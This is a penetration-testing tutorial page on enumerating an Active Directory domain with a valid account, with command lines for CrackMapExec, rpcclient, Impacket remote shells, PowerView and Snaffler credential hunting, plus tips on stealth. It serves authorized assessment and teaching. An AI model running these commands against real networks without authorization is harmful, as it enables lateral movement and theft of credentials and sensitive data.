---
title: "Credentialed Enumeration"
description: "Digging into the domain once you hold a valid account — CrackMapExec, rpcclient, Impacket, and the Windows-native AD module, PowerView, and Snaffler."
tags:
  - Active Directory
  - Enumeration
  - CrackMapExec
  - PowerView
  - LDAP
---

# Credentialed Enumeration

A single valid domain credential — from a cracked [poisoning](llmnr-nbtns-poisoning.md) capture or a successful [spray](password-spraying.md) — changes everything. Almost every AD enumeration tool only needs valid creds **at any privilege level** to run; a help-desk account can map the same users, groups, GPOs, ACLs, and trusts as a Domain Admin can.

!!! note "Goal of this phase"
    Find misconfigurations and excess permissions that enable lateral or vertical movement, map group/trust structure, and pillage file shares for sensitive data. Some findings here are purely informational for the report, not direct attack paths — document both.

## From Linux

### CrackMapExec (CME / NetExec)

The Swiss-army knife, built on Impacket and PowerSploit. Works over SMB, WinRM, MSSQL, and SSH.

```bash
crackmapexec smb -h       # per-protocol help menus exist for each protocol
```

| Flag | Purpose |
| :--- | :--- |
| `-u` / `-p` / `-H` | Username / password / NTLM hash (pass-the-hash) |
| `-d` | Domain |
| `--local-auth` | Authenticate locally, not against the domain |

```bash
# Domain users — includes badPwdCount, useful for building safe spray lists
sudo crackmapexec smb <DC_IP> -u forend -p '<PASSWORD>' --users

# Domain groups + membercount — note Administrators / Domain Admins / IT groups
sudo crackmapexec smb <DC_IP> -u forend -p '<PASSWORD>' --groups

# Who is logged into a target right now
sudo crackmapexec smb <TARGET_IP> -u forend -p '<PASSWORD>' --loggedon-users

# Share enumeration + your access level
sudo crackmapexec smb <DC_IP> -u forend -p '<PASSWORD>' --shares

# Spider a specific share for interesting files
sudo crackmapexec smb <DC_IP> -u forend -p '<PASSWORD>' -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/<DC_IP>.json
```

`(Pwn3d!)` appearing after a host in CME output means **your account is local admin there** — a lateral movement target. If `--loggedon-users` shows a Domain Admin logged into that same box, it's an immediate credential-theft objective.

Default shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) are expected; anything else — department shares, user home shares, old archive shares — is where passwords and PII actually live.

### SMBMap

```bash
# Check access across all shares
smbmap -u forend -p '<PASSWORD>' -d <DOMAIN> -H <DC_IP>

# Recursive directory-only listing of one share, for pillaging
smbmap -u forend -p '<PASSWORD>' -d <DOMAIN> -H <DC_IP> -R 'Department Shares' --dir-only
```

### rpcclient

A Samba tool that speaks MS-RPC directly — can enumerate (and even modify) AD objects.

```bash
rpcclient -U "" -N <DC_IP>          # null session, if allowed
rpcclient $> enumdomusers           # all domain users + RID
rpcclient $> queryuser 0x457        # detail on one RID
```

Every object's SID is the domain SID plus a **RID** in hex:

```text
Domain SID:  S-1-5-21-3842939050-3880317879-2865463114
+ RID (0x457 = 1111 decimal)
= Full SID: S-1-5-21-3842939050-3880317879-2865463114-1111
```

| RID (hex) | RID (dec) | Account |
| :--- | :--- | :--- |
| `0x1f4` | 500 | Administrator (always) |
| `0x1f5` | 501 | Guest |
| `0x1f6` | 502 | krbtgt |

### Impacket — remote execution once you find local admin

| Tool | Runs as | Drops files | Stealth | Logging |
| :--- | :--- | :--- | :--- | :--- |
| `psexec.py` | SYSTEM | Yes, on `ADMIN$` | Lower | Service creation event, more visible |
| `wmiexec.py` | Connecting user | No | Higher | No dropped binary, but each command is a new `cmd.exe` → Event ID 4688 |

```bash
# psexec.py — uploads to ADMIN$, registers a service, SYSTEM shell over a named pipe
psexec.py <DOMAIN>/wley:'<PASSWORD>'@<TARGET_IP>

# wmiexec.py — semi-interactive shell via WMI, fewer logs, runs as the connecting user
wmiexec.py <DOMAIN>/wley:'<PASSWORD>'@<TARGET_IP>
```

### Windapsearch — LDAP enumeration

```bash
# Domain Admins group membership
python3 windapsearch.py --dc-ip <DC_IP> -u forend@<DOMAIN> -p '<PASSWORD>' --da

# Privileged users via recursive/nested group lookup — great reporting value
python3 windapsearch.py --dc-ip <DC_IP> -u forend@<DOMAIN> -p '<PASSWORD>' -PU
```

`-PU` walks nested group membership and mutates against common privileged-group names (including non-English variants) — it's the single best way to demonstrate the danger of nested groups to a client, since "member of Domain Admins" is easy to grep for but "member of a group that's a member of Domain Admins" is usually invisible until you look.

## From Windows

### ActiveDirectory PowerShell module

147 built-in cmdlets. Using it is **stealthier** than dropping an external tool — it blends into ordinary admin activity that already touches the environment.

```powershell
Get-Module                     # confirm what's already loaded
Import-Module ActiveDirectory

Get-ADDomain                                   # domain SID, functional level, FSMO holders
Get-ADTrust -Filter *                           # trust direction, type, target domain

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# ^ Kerberoastable accounts — feed the list into kerberoasting.md

Get-ADGroup -Filter * | select name
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView

More manual than BloodHound, but it surfaces subtle misconfigurations BloodHound's data model doesn't always expose cleanly. Now maintained by BC-Security as part of Empire 4.

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

| Function | Purpose |
| :--- | :--- |
| `Get-DomainUser` / `Get-DomainComputer` / `Get-DomainGroup` | Core object enumeration |
| `Get-DomainGroupMember -Recurse` | Nested group membership |
| `Get-DomainTrustMapping` | Enumerate every trust the domain sees |
| `Find-InterestingDomainAcl` | ACLs granting modification rights over non-built-in objects |
| `Find-DomainUserLocation` | Where a specific user is logged in |
| `Find-DomainShare` / `Find-InterestingDomainShareFile` | Reachable shares, and files matching interesting criteria |
| `Find-LocalAdminAccess` / `Test-AdminAccess` | Where the current user has local admin |
| `Get-DomainSPNTicket` | Request a Kerberos ticket for an SPN (Kerberoast from PowerView) |

```powershell
Get-DomainUser -Identity mmorgan -Domain <DOMAIN> |
  Select-Object name,samaccountname,description,memberof,pwdlastset,admincount,serviceprincipalname,useraccountcontrol

Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

!!! tip "ASREPRoastable at a glance"
    `useraccountcontrol: DONT_REQ_PREAUTH` on a user means that account doesn't require Kerberos pre-authentication — an AS-REP Roasting target.

### SharpView

A .NET port of PowerView, useful when PowerShell itself is hardened or logged more aggressively than compiled binaries.

```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```

### Snaffler — automated credential hunting

Snaffler walks the host list, enumerates shares and readable directories, and flags files likely to contain credentials. Must run from a domain-joined host or in a domain-user context.

```powershell
Snaffler.exe -s -d <DOMAIN> -o snaffler.log -v data
```

| Output colour | Meaning |
| :--- | :--- |
| **Red** | Highest value — `.key`, `.sqldump`, `.mdf`, `.keypair`, `.keychain` |
| **Green** | Shares discovered |
| **Black** | Lower priority but worth a look — `.kdb`, `.ppk`, `.psafe3` |

Classic finds include `web.config` files with a hardcoded database connection string — username and password sitting in plaintext in a readable share.

## Why shares matter

Overly permissive file shares are one of the most common real findings on an internal assessment — HR, legal, medical, and IT config shares holding sensitive data or outright credentials with no access control behind them. It's also a direct compliance issue (HIPAA, PCI) worth calling out independently of any attack path it enables.

## Operational notes

- Document every file transferred to or from a host, and where it landed on disk — needed for deconfliction if something is noticed.
- Clean up dropped tools and created services at the end of the engagement, scope permitting.
- The native ActiveDirectory module blends in better than anything that has to be transferred first.

## Next

Once you've mapped users, groups, and shares manually, [BloodHound](bloodhound.md) correlates all of it — sessions, ACLs, group nesting, trusts — into a graph and will usually hand you the shortest path to Domain Admin directly.
